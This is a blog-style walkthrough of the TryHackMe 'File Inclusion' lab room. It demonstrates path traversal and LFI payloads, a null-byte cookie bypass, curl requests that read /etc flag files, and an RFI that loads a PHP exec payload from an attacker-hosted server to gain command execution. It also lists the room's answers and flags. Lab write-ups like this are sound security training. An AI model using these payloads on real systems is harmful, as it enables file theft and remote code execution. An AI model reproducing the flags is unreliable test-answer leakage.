# File Inclusion Room walkthrough from TryHackMe (with explanation of answers)

This room was challenging so I chose it for this week's writeup.

## Task 1 Introduction

"By the end of this room, you will be able to:

* Explain the difference between path traversal, LFI, and RFI
* Identify file inclusion entry points in a web application
* Exploit LFI and RFI vulnerabilities to read sensitive files and gain remote code execution
* Apply remediation techniques to prevent file inclusion vulnerabilities"

Well with that in mind,

_Let's continue to the next section to deploy the attached VM._

**No answer needed**

## Task 2 Deploy the VM

As always, we start the attacker machine and the lab machine. Then we navigate to **http://LAB_MACHINE_IP/** .

_Once you've deployed the VM, please wait a few minutes for the webserver to start, then progress to the next section!_

**No answer needed**

## Task 3 Path Traversal

The material covers how file inclusion and path traversal vulnerabilities work and some common target files. With that recently acquired knowledge we can answer:

_What function causes path traversal vulnerabilities in PHP?_

**file_get_contents**

## Task 4 Local File Inclusion - LFI

_Give Lab #1 a try to read /etc/passwd. What would the request URI be?_

<img width="1357" height="1408" alt="image" src="https://github.com/user-attachments/assets/31d6bfd6-9144-405b-9af8-12e143bd441b" />

We go into lab 1.

I tried putting "welcome.php" as the file name in the input form, and the output is shown below.
<img width="1366" height="1435" alt="image" src="https://github.com/user-attachments/assets/19fbebca-c55f-4458-ac83-18898b29303d" />


The url was as the following:

```
http://LAB_MACHINE_IP/lab1.php?file=welcome.php
```
All we need to do is change welcome.php to /etc/passwd and there we go:
<img width="1298" height="1045" alt="image" src="https://github.com/user-attachments/assets/686f6bc7-ebbd-479b-b488-52ba64bbaf3d" />

Final answer:

**/lab1.php?file=/etc/passwd**

---

_In Lab #2, what is the directory specified in the include function?_

We go the Lab 2. Again we enter welcome.php as a example (so the website will help us format the URL), and then we modify the file value to an invalid one.

Original:

```
http://LAB_MACHINE_IP/lab1.php?file=welcome.php
```

Modified:

```
http://LAB_MACHINE_IP/lab1.php?file=THM
```

And we are shown some errors.
<img width="1311" height="517" alt="image" src="https://github.com/user-attachments/assets/1a2ef6d0-6e5f-4f9a-8a97-ab499d25b1ba" />

Final answer:

**includes**

## Task 5 Local File Inclusion - LFI Continued

_Give Lab #3 a try to read /etc/passwd. What is the request look like?_

Going to Lab 3, I included the file "welcome" in the input form and the output is shown below:
<img width="1395" height="1148" alt="image" src="https://github.com/user-attachments/assets/d79d08ea-c7fa-442d-a528-d7d9ee3ea04e" />

Knowing the full path tells us exactly how many ../ sequences we need so the final answer is:

**/lab3.php?file=../../../../etc/passwd**

---

_Which function is causing the directory traversal in Lab #4?_

This question is somewhat similar to the last question in Task 4:

Go to Lab 4.

I entered welcome.php as a test, and in the url I modified the file parameter to **THM** (an invalid option) and triggered an error:
<img width="1375" height="1138" alt="image" src="https://github.com/user-attachments/assets/4c007b80-8b19-4160-9884-0a50af9f5283" />

The function **file_get_contents** is causing the directory traversal.

---

_Try out Lab #6 and check what is the directory that has to be in the input field?_

**THM-profile**

(This is quite obvious so I will not elaborate)

---

_Try out Lab #6 and read /etc/os-release. What is the VERSION_ID value?_

I tried THM-profile/etc/os-release in the file input field and it returned an error.
<img width="1403" height="1291" alt="image" src="https://github.com/user-attachments/assets/6410bf39-52f5-43e7-9de8-5586731b678b" />


Knowing the current path, we can leverage ../ to get the file contents of the os-release file.

In the input form, include:

```
THM-profile/../../../../etc/os-release
```

and the output is as below

<img width="1258" height="672" alt="image" src="https://github.com/user-attachments/assets/aabe8074-d99a-42e1-8ef1-ad7aec85615e" />

The VERSION_ID value is **12.04** .

## Task 6 Remote File Inclusion

_We showed how to include PHP pages via RFI. Do research on how to get remote command execution (RCE), and answer the question in the challenge section._

**No answer needed**

(I will include this in the next task)

## Task 7 Challenge

We go to

http://LAB_MACHINE_IP/challenges/index.php

_Capture Flag1 at /etc/flag1_

Click on the Challenge 1 link, and we see something like this
<img width="1338" height="1205" alt="image" src="https://github.com/user-attachments/assets/f6fc5d6a-0bbd-4dc5-83b9-0adbc3eb74ab" />


There are two ways you can get the flag:

1. Right click to Inspect in firefox, and inside Inspector we can see this line of code:
   <img width="773" height="291" alt="image" src="https://github.com/user-attachments/assets/e5877f97-42c5-4d1c-a1cb-6e441e243c54" />


* Change the method to POST
* In the input field for the file name, put "/etc/flag1"
* It reveals the flag:
<img width="1378" height="1043" alt="image" src="https://github.com/user-attachments/assets/a1db6b00-e23f-4739-9c2b-e1c4d5d6ec1c" />

2. Second method: we use terminal (curl)
I used the command below

```
curl http://MACHINE_IP/challenges/chall1.php -X POST -d "file=/etc/flag1"
```

* -X specifies the HTTP request method
* -d sends specified data in an HTTP request body to a server

<img width="1229" height="767" alt="image" src="https://github.com/user-attachments/assets/eb7509bd-d360-4a49-befb-1a2d6da234ad" />

Final flag:

**F1x3d-iNpu7-f0rrn**

---

_Capture Flag2 at /etc/flag2_

We go to the link for Challenge 2, and we are asked to refresh the page. 

After we do that we see:

<img width="1600" height="1115" alt="image" src="https://github.com/user-attachments/assets/73915686-cc69-44a7-90c0-d6e389d635e4" />


Again, we right click to inspect. I clicked on the storage tab, and under cookies I found some interesting items:

<img width="1600" height="396" alt="image" src="https://github.com/user-attachments/assets/242e69b0-a579-4edc-821a-a11064cd483b" />


I changed the Value from Guest to Admin.

This still returns some errors:

<img width="1600" height="777" alt="image" src="https://github.com/user-attachments/assets/79d87a71-5239-432b-8aaa-705c955dd4bc" />


Still in Cookies, I changed the Value from admin to ../../../../etc/flag2%00

(with a null byte)

returns the flag:

<img width="1600" height="1034" alt="image" src="https://github.com/user-attachments/assets/cc74dbba-24ac-4496-a616-c0186e7df097" />

Final flag:

**c00k13_i5_yuMmy1**

---

_Capture Flag3 at /etc/flag3_

Going to Challenge 3, I simply tried to put /etc/flag3 in the input form. 

Sadly that didn't work.
<img width="1524" height="654" alt="image" src="https://github.com/user-attachments/assets/0ff481db-8987-44f7-82b2-a4c1e7d9eead" />

It returned an error as shown above. Here we can see that the `/` doesn't get included in the file path, and there is a `.php` added at the end. By changing the request method to POST, it includes the `/` .

It also adds a `.php` : we can bypass this by using a null byte (%00)

So I formed a final command:

```
curl http://MACHINE_IP/challenges/chall3.php -X POST -d "file=/etc/flag3%00" --output flag3.txt
```

Afterwards use cat to view the file we saved the ouput to:

```
cat flag3.txt
```

And that gave us the flag!

**P0st_1s_w0rk1in9**

---

_Gain RCE in Lab #Playground /playground.php with RFI to execute the hostname command. What is the output?

1. We make the file:

```
nano cmd.txt
```

Inside the text editor, we form a payload that will execute the hostname command.

```
<?PHP print exec('hostname'); ?>
```

Control X to save, then Y and press enter.

2. Then we start the local server (in another terminal tab), I'm using port 8080,

```
python3 -m http.server 8080
```

and we go to the url:

```
http://LAB_MACHINE_IP/playground.php?file=http://ATTACK_MACHINE_IP:8080/cmd.txt
```

<img width="1600" height="1076" alt="image" src="https://github.com/user-attachments/assets/de4a25b2-2444-4fd7-bc41-4ede4316a9d1" />

Final answer: **lfi-vm-thm-f8c5b1a78692**

## Task 8 Remediation

I can now exploit LFI vulnerabilities! 

That is all for this week, and thank you for reading to the end. If you found this helpful please star this respo. Bye!
